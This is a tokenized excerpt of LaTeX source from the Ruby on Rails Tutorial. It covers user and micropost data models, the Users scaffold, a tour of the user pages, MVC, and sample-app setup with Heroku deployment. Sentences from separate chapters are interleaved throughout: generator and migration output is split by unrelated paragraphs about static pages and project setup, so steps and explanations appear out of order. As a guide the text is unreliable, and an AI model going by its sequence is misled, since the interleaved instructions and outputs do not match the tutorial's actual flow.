▁There ▁are ▁as ▁many ▁choice s ▁for ▁a ▁user ▁data ▁model ▁as ▁there ▁are ▁different ▁re g ist r ation ▁forms ▁on ▁the ▁web ; ▁we ' ll ▁go ▁with ▁a ▁ distinct ly ▁minimal ist ▁approach .
▁Users ▁of ▁our ▁toy ▁app ▁will ▁have ▁a ▁unique ▁\ k ode { integer } ▁identifier ▁called ▁\ k ode { id }, ▁a ▁public ly ▁view able ▁\ k ode { name } ▁( of ▁type ▁\ k ode { string }), ▁and ▁an ▁\ k ode { email } ▁address ▁( also ▁a ▁\ k ode { string }) ▁that ▁will ▁double ▁as ▁a ▁username .
▁A ▁summary ▁of ▁the ▁data ▁model ▁for ▁users ▁appears ▁in ▁F igure ~\ ref { fig : demo _ user _ model }.
▁The ▁data ▁model ▁for ▁users .
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : database _ migrations }, ▁the ▁ label ▁\ k ode { users } ▁in ▁F igure ~\ ref { fig : demo _ user _ model } ▁correspond s ▁to ▁a ▁\ emph { table } ▁in ▁a ▁database , ▁and ▁the ▁\ k ode { id }, ▁\ k ode { name }, ▁and ▁\ k ode { email } ▁attributes ▁are ▁\ emph { columns } ▁in ▁that ▁table .
▁< n >< n > ▁% ▁subsection ▁model ing _ users ▁( end )< n >< n > ▁\ subsection { A ▁toy ▁model ▁for ▁microposts } ▁% ▁( fold )< n > ▁\ label { sec : modeling _ demo _ microposts }< n >< n >
▁The ▁core ▁of ▁the ▁micropost ▁data ▁model ▁is ▁even ▁simple r ▁than ▁the ▁one ▁for ▁users : ▁a ▁micropost ▁has ▁only ▁an ▁\ k ode { id } ▁and ▁a ▁\ k ode { content } ▁field ▁for ▁the ▁micropost ' s ▁text ▁( of ▁type ▁\ k ode { text })
▁Because ▁microposts ▁are ▁short ▁by ▁design , ▁the ▁\ k ode { string } ▁type ▁is ▁actually ▁big ▁enough ▁to ▁contain ▁them , ▁but ▁using ▁\ k ode { text } ▁better ▁express es ▁our ▁in t ent , ▁while ▁also ▁giv ing ▁us ▁greater ▁flexibility ▁should ▁we ▁ever ▁wish ▁to ▁re la x ▁the ▁length ▁constraint .
▁There ' s ▁an ▁ additional ▁com plication , ▁though : ▁we ▁want ▁to ▁\ emph { associate } ▁each ▁micropost ▁with ▁a ▁particular ▁user . ▁We ' ll ▁accomplish ▁this ▁by ▁record ing ▁the ▁\ k ode { user \_ id } ▁of ▁the ▁own er ▁of ▁the ▁post .
▁The ▁results ▁are ▁show n ▁in ▁F igure ~\ ref { fig : demo _ micropost _ model }.
▁The ▁data ▁model ▁for ▁microposts .
▁We ' ll ▁see ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁( and ▁more ▁fully ▁in ▁Chapter ~\ ref { cha : user _ microposts }) ▁how ▁this ▁\ k ode { user \_ id } ▁attribute ▁allows ▁us ▁to ▁succinct ly ▁express ▁the ▁not ion ▁that ▁a ▁user ▁ potentially ▁has ▁many ▁ associated ▁microposts .
▁< n >< n > ▁% ▁subsection ▁model ing _ microposts ▁( end )< n >< n >% ▁section ▁ planning _ the _ application ▁( end )< n >< n > ▁\ section { The ▁Users ▁resource } ▁% ▁( fold )< n > ▁\ label { sec : demo _ users _ resource }< n >< n >
▁In ▁this ▁section , ▁we ' ll ▁implement ▁the ▁users ▁data ▁model ▁in ▁Section ~\ ref { sec : modeling _ demo _ users }, ▁along ▁with ▁a ▁web ▁interface ▁to ▁that ▁model .
▁The ▁combination ▁will ▁ const it ute ▁a ▁\ emph { Users ▁resource }, ▁which ▁will ▁allow ▁us ▁to ▁think ▁of ▁users ▁as ▁objects ▁that ▁can ▁be ▁created , ▁read , ▁updated , ▁and ▁deleted ▁through ▁the ▁web ▁via ▁the ▁\ href { http :// en . wiki p edia . org / wiki / H ypertext _ Transfer _ Protocol }{ HTTP ▁protocol }.
▁As ▁ promised ▁in ▁the ▁introduction , ▁our ▁Users ▁resource ▁will ▁be ▁created ▁by ▁a ▁scaffold ▁generator ▁program , ▁which ▁comes ▁standard ▁with ▁each ▁Rails ▁project .
▁I ▁ ur ge ▁you ▁not ▁to ▁look ▁too ▁close ly ▁at ▁the ▁generated ▁code ; ▁at ▁this ▁stage , ▁it ▁will ▁only ▁serve ▁to ▁confuse ▁you .
▁Rails ▁scaffolding ▁is ▁generated ▁by ▁passing ▁the ▁\ k ode { scaffold } ▁command ▁to ▁the ▁\ k ode { rails ▁generate } ▁ script .
▁The ▁argument ▁of ▁the ▁\ k ode { scaffold } ▁command ▁is ▁the ▁singular ▁version ▁of ▁the ▁resource ▁name ▁( in ▁this ▁case , ▁\ k ode { User }), ▁together ▁with ▁optional ▁parameters ▁for ▁the ▁data ▁model ' s ▁attributes
▁The ▁name ▁of ▁the ▁scaffold ▁follows ▁the ▁convention ▁of ▁\ emph { models }, ▁which ▁are ▁singular , ▁rather ▁than ▁resources ▁and ▁controllers , ▁which ▁are ▁plural .
▁Thus , ▁we ▁have ▁\ k ode { User } ▁instead ▁of ▁\ k ode { Users }.
▁ $ ▁rails ▁generate ▁scaffold ▁User ▁name : string ▁email : string
▁invoke ▁resource _ route
▁route ▁resources ▁: users
▁invoke ▁scaffold _ controller
▁create ▁app / controllers / users _ controller . rb
▁invoke ▁ erb
▁create ▁app / views / users
▁create ▁app / views / users / index . html . erb
▁create ▁app / views / users / edit . html . erb
▁create ▁app / views / users / show . html . erb
▁create ▁app / views / users / new . html . erb
▁create ▁app / views / users / _ form . html . erb
▁create ▁test / controllers / users _ controller _ test . rb
▁invoke ▁helper
▁create ▁app / helpers / users _ helper . rb
▁invoke ▁test _ unit
▁create ▁test / helpers / users _ helper _ test . rb
▁invoke ▁ j builder
▁create ▁app / views / users / index . json . j builder
▁create ▁app / views / users / show . json . j builder
▁invoke ▁ scss
▁In ▁this ▁chapter , ▁we ▁will ▁begin ▁developing ▁the ▁p rofessional - grade ▁sample ▁application ▁that ▁will ▁serve ▁as ▁our ▁example ▁throughout ▁the ▁rest ▁of ▁this ▁tutorial .
▁create ▁app / assets / stylesheets / scaffold s . css . scss
▁A lthough ▁the ▁sample ▁app ▁will ▁eventual ly ▁have ▁users , ▁microposts , ▁and ▁a ▁full ▁login ▁and ▁authentication ▁framework , ▁we ▁will ▁begin ▁with ▁a ▁seem ing ly ▁ limited ▁topic : ▁the ▁creation ▁of ▁static ▁pages .
▁By ▁including ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁have ▁arrange d ▁for ▁the ▁User ▁model ▁to ▁have ▁the ▁form ▁show n ▁in ▁F igure ~\ ref { fig : demo _ user _ model }.
▁( Note ▁that ▁there ▁is ▁no ▁need ▁to ▁include ▁a ▁parameter ▁for ~\ k ode { id } ; ▁it ▁is ▁created ▁automatically ▁by ▁Rails ▁for ▁use ▁as ▁the ▁\ emph { primary ▁key } ▁in ▁the ▁database .)
▁De s p ite ▁its ▁apparent ▁simplicity , ▁making ▁static ▁pages ▁is ▁a ▁high ly ▁instruct ive ▁exercise , ▁rich ▁in ▁implications --- a ▁ perfect ▁start ▁for ▁our ▁ n as c ent ▁application .
▁A lthough ▁Rails ▁is ▁design ed ▁for ▁making ▁database - back ed ▁dynamic ▁website s , ▁it ▁also ▁ ex ce l s ▁at ▁making ▁the ▁kind ▁of ▁static ▁pages ▁we ▁m ight ▁make ▁with ▁raw ▁HTML ▁files .
▁== ▁Create Users : ▁migrat ing ▁ ========== ================ ========== ================
▁In ▁fact , ▁using ▁Rails ▁even ▁for ▁static ▁pages ▁yields ▁a ▁ distinct ▁advantage : ▁we ▁can ▁easily ▁add ▁just ▁a ▁\ emph { small } ▁amount ▁of ▁dynamic ▁content .
▁-- ▁create _ table (: users )
▁In ▁this ▁chapter ▁we ' ll ▁learn ▁how .
▁-> ▁0.0 0 17 s
▁A long ▁the ▁way , ▁we ' ll ▁get ▁our ▁first ▁taste ▁of ▁\ emph { auto m at ed ▁testing }, ▁which ▁will ▁help ▁us ▁be ▁more ▁confident ▁that ▁our ▁code ▁is ▁correct .
▁== ▁Create Users : ▁migrat ed ▁( 0 . 00 18 s ) ▁= ========== ================ ================
▁More over , ▁ having ▁a ▁good ▁test ▁suite ▁will ▁allow ▁us ▁to ▁\ emph { re factor } ▁our ▁code ▁with ▁confidence , ▁changing ▁its ▁form ▁without ▁changing ▁its ▁function .
▁< n >< n >\ section { S ample ▁app ▁setup } ▁% ▁( fold )< n >\ label { sec : sample _ app _ setup }< n >< n > As ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁before ▁getting ▁started ▁we ▁need ▁to
▁This ▁simply ▁update s ▁the ▁database ▁with ▁our ▁new ▁\ k ode { users } ▁data ▁model .
▁( We ' ll ▁learn ▁more ▁about ▁database ▁migrations ▁starting ▁in ▁Section ~\ ref { sec : database _ migrations }. )
▁as ▁show n ▁in ▁Listing ~\ ref { code : rails _ new _ sample _ app }.
▁On ▁many ▁systems , ▁including ▁the ▁cloud ▁IDE , ▁you ▁can ▁omit ▁\ k ode { bundle ▁exec }, ▁but ▁it ▁is ▁necessary ▁on ▁some ▁systems , ▁so ▁I ' ll ▁include ▁it ▁for ▁completeness .
▁If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁it ' s ▁often ▁useful ▁to ▁use ▁the ▁`` G o to ▁Any th ing '' ▁command , ▁which ▁make s ▁it ▁easy ▁to ▁navigate ▁the ▁file system ▁by ▁typing ▁in ▁partial ▁filename s .
▁With ▁that , ▁we ▁can ▁run ▁the ▁local ▁web ▁server ▁in ▁a ▁separate ▁tab ▁( F igure ~\ ref { fig : rails _ server _ new _ t a b }) ▁as ▁follows
▁In ▁this ▁context , ▁ having ▁the ▁ hello , ▁toy , ▁and ▁sample ▁app s ▁present ▁in ▁the ▁same ▁project ▁can ▁be ▁in co n ve n i ent ▁due ▁to ▁the ▁many ▁common ▁filename s .
▁The ▁\ k ode { rails } ▁ script ▁is ▁design ed ▁so ▁that ▁you ▁don ' t ▁need ▁to ▁use ▁\ k ode { bundle ▁exec }.
▁Thus , ▁you ▁may ▁want ▁to ▁consider ▁remov ing ▁the ▁first ▁two ▁app s ▁before ▁proceeding , ▁which ▁you ▁can ▁do ▁by ▁navigat ing ▁to ▁the ▁\ k ode { workspace } ▁directory ▁and ▁running ▁\ k ode { rm ▁- r f ▁ hello \_ app / ▁toy \_ app / } ▁( Table ~\ ref { table : un i x _ command s }).
▁Now ▁the ▁toy ▁application ▁should ▁be ▁available ▁on ▁the ▁local ▁server ▁as ▁describe d ▁in ▁Section ~\ ref { sec : rails _ server }.
▁( As ▁long ▁as ▁you ▁push ed ▁the ▁corresponding ▁repositories ▁up ▁to ▁Bitbucket , ▁you ▁can ▁always ▁re c over ▁them ▁later .)
▁( If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁be ▁sure ▁to ▁open ▁the ▁result ing ▁development ▁server ▁in ▁a ▁new ▁\ emph { browser } ▁tab , ▁not ▁inside ▁the ▁IDE ▁itself .)
▁In ▁the ▁Unix ▁tr ad it ion , ▁the ▁\ href { http :// en . wiki p edia . org / wiki / Make _ ( s of t w a re ) }{\ emph { make } } ▁utility ▁has ▁ play ed ▁an ▁important ▁role ▁in ▁build ing ▁executable ▁program s ▁from ▁source ▁code ; ▁many ▁a ▁computer ▁ha c k er ▁has ▁commit t ed ▁to ▁m us c le ▁memory ▁the ▁line
▁Generat ing ▁a ▁new ▁sample ▁app .
▁< n > ▁ $ ▁ . / config ure ▁ && ▁make ▁ && ▁ s u do ▁make ▁install
▁( As ▁in ▁Section ~\ ref { sec : planning _ the _ application }, ▁note ▁that ▁users ▁of ▁the ▁cloud ▁IDE ▁can ▁create ▁this ▁project ▁in ▁the ▁same ▁ workspace ▁as ▁the ▁applications ▁from ▁the ▁previous ▁two ▁chapter s .
▁commonly ▁used ▁to ▁ compile ▁code ▁on ▁Unix ▁systems ▁( including ▁L in u x ▁and ▁Mac ▁OS ~ X ).
▁It ▁is ▁not ▁necessary ▁to ▁create ▁a ▁new ▁ workspace .)
▁Rake ▁is ▁\ emph { Ruby ▁make }, ▁a ▁make - like ▁language ▁written ▁in ▁Ruby .
▁Rails ▁uses ▁Rake ▁ ext en s ive ly , ▁es pecially ▁for ▁the ▁in numerable ▁little ▁ administrative ▁task s ▁necessary ▁when ▁developing ▁database - back ed ▁web ▁applications .
▁Listing ~\ ref { code : gemfile _ sample _ app } ▁is ▁identical ▁to ▁Listing ~\ ref { code : gemfile _ sqlite _ version } ▁and ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux } ▁a part ▁from ▁the ▁gems ▁in ▁the ▁\ k ode { test } ▁group , ▁which ▁are ▁needed ▁for ▁the ▁optional ▁advanced ▁testing ▁setup ▁( Section ~\ ref { sec : advance d _ test ing _ setup }).
▁The ▁\ k ode { rake ▁db : migrate } ▁command ▁is ▁ probably ▁the ▁most ▁common , ▁but ▁there ▁are ▁many ▁other s ; ▁you ▁can ▁see ▁a ▁list ▁of ▁database ▁task s ▁using ▁\ k ode { - T ▁db } :
▁< n > ▁ $ ▁bundle ▁exec ▁rake ▁- T ▁db
▁\ emph { Note } : ▁If ▁you ▁would ▁like ▁to ▁install ▁\ emph { all } ▁the ▁gems ▁needed ▁for ▁the ▁sample ▁application , ▁you ▁should ▁use ▁the ▁code ▁in ▁Listing ~\ ref { code : final _ gemfile } ▁at ▁this ▁time .
▁To ▁see ▁all ▁the ▁Rake ▁task s ▁available , ▁run
▁< n > ▁ $ ▁bundle ▁exec ▁rake ▁- T
▁The ▁list ▁is ▁likely ▁to ▁be ▁over w hel m ing , ▁but ▁don ' t ▁worry , ▁you ▁don ' t ▁have ▁to ▁know ▁all ▁( or ▁even ▁most ) ▁of ▁these ▁commands .
▁By ▁the ▁end ▁of ▁the ▁\ emph { Rails ▁Tutorial }, ▁you ' ll ▁know ▁all ▁the ▁most ▁important ▁one s .
▁This ▁arrange s ▁to ▁skip ▁the ▁\ text tt { p g } ▁gem ▁for ▁PostgreSQL ▁in ▁development ▁and ▁use ▁SQLite ▁for ▁development ▁and ▁testing .
▁If ▁we ▁visit ▁the ▁root ▁URL ▁at ~ / ▁( read ▁`` slash '' , ▁as ▁noted ▁in ▁Section ~\ ref { sec : hello _ world }), ▁we ▁get ▁the ▁same ▁default ▁Rails ▁page ▁show n ▁in ▁F igure ~\ ref { fig : riding _ rails }, ▁but ▁in ▁ generating ▁the ▁Users ▁resource ▁scaffolding ▁we ▁have ▁also ▁created ▁a ▁large ▁number ▁of ▁pages ▁for ▁m anipulating ▁users .
▁Heroku ▁recommend s ▁again st ▁using ▁different ▁database s ▁in ▁development ▁and ▁production , ▁but ▁for ▁the ▁sample ▁application ▁it ▁won ' t ▁make ▁any ▁difference , ▁and ▁SQLite ▁is ▁\ emph { much } ▁easier ▁than ▁PostgreSQL ▁to ▁install ▁and ▁configure ▁local ly
▁For ▁example , ▁the ▁page ▁for ▁list ing ▁all ▁users ▁is ▁at ▁\ href { http :// localhost :3000/ users }{/ users }, ▁and ▁the < n > page ▁for ▁making ▁a ▁new ▁user ▁is ▁at ▁\ href { http :// localhost :3000/ users / new }{/ users / new }.
▁I ▁recommend ▁eventual ly ▁learning ▁how ▁to ▁install ▁and ▁configure ▁PostgreSQL ▁in ▁development , ▁but ▁the ▁chance s ▁are ▁now ▁is ▁not ▁that ▁time .
▁The ▁rest ▁of ▁this ▁section ▁is ▁d ed icated ▁to ▁tak ing ▁a ▁ w h ir l w in d ▁to ur ▁through ▁these ▁user ▁pages .
▁When ▁the ▁time ▁comes , ▁Google ▁`` install ▁configure ▁ postgresql ▁< your ▁system > '' ▁and ▁`` rails ▁ postgresql ▁setup '' ▁and ▁ prepare ▁for ▁a ▁ cha ll en ge .
▁As ▁we ▁proceed , ▁it ▁may ▁help ▁to ▁refer ▁to ▁Table ~\ ref { table : user _ url s }, ▁which ▁shows ▁the ▁correspond ence ▁between ▁pages ▁and ▁URLs .
▁( O n ▁the ▁cloud ▁IDE , ▁< your ▁system > ▁is ▁U b un t u .)
▁page ▁to ▁show ▁user ▁with ▁id ▁\ k ode {1}
▁page ▁to ▁make ▁a ▁new ▁user
▁The ▁correspond ence ▁between ▁pages ▁and ▁URLs ▁for ▁the ▁Users ▁resource .
▁We ▁start ▁with ▁the ▁page ▁to ▁show ▁all ▁the ▁users ▁in ▁our ▁application , ▁called ▁\ href { http :// localhost :3000/ users }{\ text tt { index } } ; ▁as ▁you ▁m ight ▁expect , ▁initially ▁there ▁are ▁no ▁users ▁at ▁all ▁( F igure ~\ ref { fig : demo _ blank _ user _ index _ rails _3} ).
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http :// localhost :3000/ users }{/ users }).
▁To ▁make ▁a ▁new ▁user , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users / new }{\ text tt { new } } ▁page , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : demo _ new _ user _ rails _3} .
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁this ▁will ▁become ▁the ▁user ▁signup ▁page .
▁ $ ▁bundle
▁The ▁new ▁user ▁page ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }).
▁\ label { fig : demo _ new _ user _ rails _3} }< n >\ end { figure }< n >< n >\ no indent
▁We ▁can ▁create ▁a ▁user ▁by ▁enter ing ▁name ▁and ▁email ▁values ▁in ▁the ▁text ▁fields ▁and ▁the n ▁click ing ▁the ▁Create ▁User ▁button .
▁With ▁that , ▁all ▁we ▁have ▁left ▁is ▁to ▁initialize ▁the ▁Git ▁repository
▁The ▁result ▁is ▁the ▁user ▁\ href { http :// localhost :3000/ users /1 }{\ text tt { show } } ▁page , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ show _ user _ rails _3} .
▁As ▁with ▁the ▁first ▁application , ▁I ▁suggest ▁updating ▁the ▁\ k ode { README } ▁file ▁( lo cat ed ▁in ▁the ▁root ▁directory ▁of ▁the ▁application ) ▁to ▁be ▁more ▁helpful ▁and ▁ de script ive .
▁( The ▁green ▁ welcome ▁message ▁is ▁accomplish ed ▁using ▁the ▁\ emph { flash }, ▁which ▁we ' ll ▁learn ▁about ▁in ▁Section ~\ ref { sec : the _ flash }. )
▁We ▁start ▁by ▁changing ▁the ▁format ▁from ▁ RDoc ▁to ▁ Markdown :
▁Note ▁that ▁the ▁URL ▁is ▁\ href { http :// localhost :3000/ users /1}{ / users /1 } ; ▁as ▁you ▁m ight ▁suspect , ▁the ▁number ~\ k ode {1} ▁is ▁simply ▁the ▁user ' s ~\ k ode { id } ▁attribute ▁from ▁F igure ~\ ref { fig : demo _ user _ model }.
▁In ▁Section ~\ ref { sec : showing _ users }, ▁this ▁page ▁will ▁become ▁the ▁user ' s ▁profile .
▁We ▁the n ▁fill ▁it ▁with ▁the ▁contents ▁show n ▁in ▁Listing ~\ ref { code : sample _ app _ readme }.
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http :// localhost :3000/ users /1}{ / users /1 }).
▁An ▁improve d ▁\ k ode { README } ▁file ▁for ▁the ▁sample ▁app .
▁To ▁change ▁a ▁user ' s ▁information , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ▁page ▁( F igure ~\ ref { fig : demo _ edit _ user _ rails _3} ).
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁sample ▁application < n >< n > This ▁is ▁the ▁sample ▁application ▁for ▁the < n >[ * Ruby ▁on ▁Rails ▁Tutorial : < n > Learn ▁Web ▁De ve lo p ment ▁with ▁Rails * ]( http :// www . railstutorial . org / )< n > by ▁[ Michael ▁Hartl ]( http :// www . michael hartl . com / ).
▁By ▁modify ing ▁the ▁user ▁information ▁and ▁click ing ▁the ▁Update ▁User ▁button , ▁we ▁arrange ▁to ▁change ▁the ▁information ▁for ▁the ▁user ▁in ▁the ▁toy ▁application ▁( F igure ~\ ref { fig : demo _ update _ user _ rails _3} ).
▁F inally , ▁we ▁commit ▁the ▁changes :
▁( As ▁we ' ll ▁see ▁in ▁detail ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁this ▁user ▁data ▁is ▁store d ▁in ▁a ▁database ▁back - end .)
▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : git _ command s } ▁that ▁we ▁used ▁the ▁Git ▁command ▁\ k ode { git ▁commit ▁- a ▁- m ▁" Message " }, ▁with ▁flag s ▁for ▁`` all ▁changes '' ▁(\ k ode { - a }) ▁and ▁a ▁message ▁(\ k ode { - m }).
▁We ' ll ▁add ▁user ▁edit / update ▁functionality ▁to ▁the ▁sample ▁application ▁in ▁Section ~\ ref { sec : updating _ users }.
▁As ▁show n ▁in ▁the ▁second ▁command ▁above , ▁Git ▁also ▁let s ▁us ▁roll ▁the ▁two ▁flag s ▁into ▁one ▁using ▁\ k ode { git ▁commit ▁- am ▁" Message " }.
▁The ▁user ▁edit ▁page ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }).
▁S ince ▁we ' ll ▁be ▁using ▁this ▁sample ▁app ▁throughout ▁the ▁rest ▁of ▁the ▁book , ▁it ' s ▁a ▁good ▁idea ▁to ▁\ href { https :// bitbucket . org / repo / create }{ create ▁a ▁new ▁repository ▁at ▁Bitbucket } ▁and ▁push ▁it ▁up :
▁A ▁user ▁with ▁updated ▁information .
▁As ▁a ▁result ▁of ▁my ▁perform ing ▁this ▁step , ▁you ▁can ▁find ▁the ▁\ href { https :// github . com / railstutorial / sample _ app _ rails _ 4 }{ Rails ▁Tutorial ▁sample ▁application ▁code ▁on ▁GitHub } ▁( un d er ▁the ▁username ▁\ text tt { railstutorial } ▁and ▁the ▁slightly ▁different ▁name ▁\ text tt { sample \_ app \_ rails \_ 4 })
▁Now ▁we ' ll ▁create ▁a ▁second ▁user ▁by ▁re visit ing ▁the ▁\ href { http :// localhost :3000/ users / new }{\ text tt { new } } ▁page ▁and ▁ submitting ▁a ▁second ▁set ▁of ▁user ▁information ; ▁the ▁result ing ▁user ▁\ href { http :// localhost :3000/ users }{\ text tt { index } } ▁is ▁show n ▁in ▁F igure ~\ ref { fig : demo _ user _ index _ two _ rails _3} .
▁To ▁avoid ▁integration ▁ head a ch es ▁later ▁on , ▁it ' s ▁also ▁a ▁good ▁idea ▁to ▁deploy ▁the ▁app ▁to ▁Heroku ▁even ▁at ▁this ▁ early ▁stage .
▁Section ~\ ref { sec : showing _ users } ▁will ▁develop ▁the ▁user ▁index ▁into ▁a ▁more ▁polish ed ▁page ▁for ▁show ing ▁all ▁users .
▁As ▁in ▁Chapter ~\ ref { cha : beginning } ▁and ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁I ▁suggest ▁following ▁the ▁`` hello , ▁world ! ''
▁The ▁user ▁index ▁page ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁with ▁a ▁second ▁user .
▁in ▁Listing ~\ ref { code : hello _ action } ▁and
▁Having ▁show n ▁how ▁to ▁create , ▁show , ▁and ▁edit ▁users , ▁we ▁come ▁finally ▁to ▁destroying ▁them ▁( F igure ~\ ref { fig : demo _ destroy _ user }).
▁As ▁noted ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁main ▁reason ▁for ▁this ▁is ▁that ▁the ▁default ▁Rails ▁page ▁typical ly ▁break s ▁at ▁Heroku , ▁which ▁make s ▁it ▁hard ▁to ▁tell ▁if ▁the ▁deployment ▁was ▁successful ▁or ▁not .
▁You ▁should ▁verify ▁that ▁click ing ▁on ▁the ▁link ▁in ▁F igure ~\ ref { fig : demo _ destroy _ user } ▁destroy s ▁the ▁second ▁user , ▁yield ing ▁an ▁index ▁page ▁with ▁only ▁one ▁user .
▁Then ▁commit ▁the ▁changes ▁and ▁push ▁up ▁to ▁Heroku :
▁( If ▁it ▁does n ' t ▁work , ▁be ▁sure ▁that ▁JavaScript ▁is ▁enabled ▁in ▁your ▁browser ; ▁Rails ▁uses ▁JavaScript ▁to ▁issue ▁the ▁request ▁needed ▁to ▁destroy ▁a ▁user .)
▁Section ~\ ref { sec : deleting _ users } ▁add s ▁user ▁deletion ▁to ▁the ▁sample ▁app , ▁tak ing ▁care ▁to ▁restrict ▁its ▁use ▁to ▁a ▁special ▁class ▁of ▁ administrative ▁users .
▁ Destroy ing ▁a ▁user .
▁Now ▁that ▁we ' ve ▁complete d ▁a ▁quick ▁ overview ▁of ▁the ▁Users ▁resource , ▁let ' s ▁examine ▁one ▁particular ▁part ▁of ▁it ▁in ▁the ▁context ▁of ▁the ▁Model - View - Controller ▁( MVC ) ▁pattern ▁introduce d ▁in ▁Section ~\ ref { sec : mvc }.
▁( As ▁in ▁Section ~\ ref { sec : deploying }, ▁you ▁may ▁see ▁some ▁warning ▁messages , ▁which ▁you ▁should ▁ignore ▁for ▁now .
▁Ou r ▁strategy ▁will ▁be ▁to ▁describe ▁the ▁results ▁of ▁a ▁typical ▁browser ▁hit --- a ▁visit ▁to ▁the ▁user ▁index ▁page ▁at ▁\ href { http :// localhost :3000/ users }{/ users }--- in ▁terms ▁of ▁MVC ▁( F igure ~\ ref { fig : mvc _ detailed }).
▁We ' ll ▁eliminate ▁them ▁in ▁Section ~\ ref { sec : p rofessional _ grade _ deploy ment }. )
▁A part ▁from ▁the ▁address ▁of ▁the ▁Heroku ▁app , ▁the ▁result ▁should ▁be ▁the ▁same ▁as ▁in ▁F igure ~\ ref { fig : heroku _ app }.
▁A ▁ detailed ▁diagram ▁of ▁MVC ▁in ▁Rails .
▁Here ▁is ▁a ▁summary ▁of ▁the ▁steps ▁show n ▁in ▁F igure ~\ ref { fig : mvc _ detailed } :
▁The ▁browser ▁issues ▁a ▁request ▁for ▁the ▁/ users ▁URL .
▁As ▁you ▁proceed ▁through ▁the ▁rest ▁of ▁the ▁book , ▁I ▁recommend ▁push ing ▁and ▁deploying ▁the ▁application ▁regular ly , ▁which ▁automatically ▁make s ▁remote ▁back up s ▁and ▁let s ▁you ▁catch ▁any ▁production ▁errors ▁as ▁soon ▁as ▁possible .
▁Rails ▁routes ▁/ users ▁to ▁the ▁\ k ode { index } ▁action ▁in ▁the ▁Users ▁controller .
▁If ▁you ▁run ▁into ▁problem s ▁at ▁Heroku , ▁make ▁sure ▁to ▁take ▁a ▁look ▁at ▁the ▁production ▁log s ▁to ▁try ▁to ▁d i a g no se ▁the ▁problem :
▁The ▁\ k ode { index } ▁action ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁all ▁users ▁(\ k ode { User . all }).
▁\ emph { Note } : ▁If ▁you ▁do ▁end ▁up ▁using ▁Heroku ▁for ▁a ▁real - life ▁application , ▁be ▁sure ▁to ▁follow ▁the ▁production ▁webserver ▁configuration ▁in ▁Section ~\ ref { sec : p rofessional _ grade _ deploy ment }.
▁The ▁User ▁model ▁pull s ▁all ▁the ▁users ▁from ▁the ▁database .
▁With ▁all ▁the ▁prepar ation ▁from ▁Section ~\ ref { sec : sample _ app _ setup } ▁finished , ▁we ' re ▁ready ▁to ▁get ▁started ▁developing ▁the ▁sample ▁application .
▁The ▁User ▁model ▁returns ▁the ▁list ▁of ▁users ▁to ▁the ▁controller .
▁Ou r ▁method ▁for ▁making ▁static ▁pages ▁is ▁ probably ▁the ▁simplest , ▁but ▁it ' s ▁not ▁the ▁only ▁way .
▁The ▁controller ▁capture s ▁the ▁users ▁in ▁the ▁\ k ode {@ users } ▁variable , ▁which ▁is ▁passed ▁to ▁the ▁\ k ode { index } ▁view .
▁The ▁opt i m al ▁method ▁really ▁depend s ▁on ▁your ▁needs ; ▁if ▁you ▁expect ▁a ▁\ emph { large } ▁number ▁of ▁static ▁pages , ▁using ▁a ▁Static ▁Pages ▁controller ▁can ▁get ▁quite ▁cumbersome , ▁but ▁in ▁our ▁sample ▁app ▁we ' ll ▁only ▁need ▁a ▁few .
▁The ▁view ▁uses ▁ embedded ▁Ruby ▁to ▁render ▁the ▁page ▁as ▁HTML .
▁If ▁you ▁do ▁need ▁a ▁lot ▁of ▁static ▁pages , ▁take ▁a ▁look ▁at ▁the ▁\ href { https :// github . com / thoughtbot / high _ v ol tag e }{\ text tt { high \_ v ol tag e } } ▁gem .
▁The ▁controller ▁passes ▁the ▁HTML ▁back ▁to ▁the ▁browser
▁For ▁a ▁date d ▁but ▁ still ▁useful ▁discussion ▁of ▁this ▁issue , ▁see ▁the ▁\ href { http :// blog . has many through . com / 200 8 / 4 / 2 / simple - pages }{ simple ▁pages ▁post ▁on ▁has many through }.
▁Some ▁reference s ▁indicate ▁that ▁the ▁view ▁returns ▁the ▁HTML ▁directly ▁to ▁the ▁browser ▁( via ▁a ▁web ▁server ▁such ▁as ▁Apache ▁or ▁N g in x ).
▁We ▁go t ▁a ▁g li mp se ▁of ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁will ▁come ▁to ▁a ▁ deep er ▁understanding ▁once ▁we ▁explor e ▁the ▁\ href { http :// en . wiki p edia . org / wiki / Re present ation al _ State _ Transfer }{ REST ▁architecture } ▁more ▁fully ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }).
▁Re g ar d less ▁of ▁the ▁implementation ▁details , ▁I ▁prefer ▁to ▁think ▁of ▁the ▁controller ▁as ▁a ▁c ent r al ▁h u b ▁through ▁which ▁all ▁the ▁application ' s ▁information ▁ flow s .
▁In ▁order ▁to ▁get ▁our ▁be ar ing s , ▁it ' s ▁helpful ▁to ▁recall ▁the ▁Rails ▁directory ▁structure ▁from ▁Section ~\ ref { sec : the _ hello _ application } ▁( F igure ~\ ref { fig : directory _ structure _ rails }).
▁Now ▁let ' s ▁take ▁a ▁look ▁at ▁the ▁above ▁steps ▁in ▁more ▁detail .
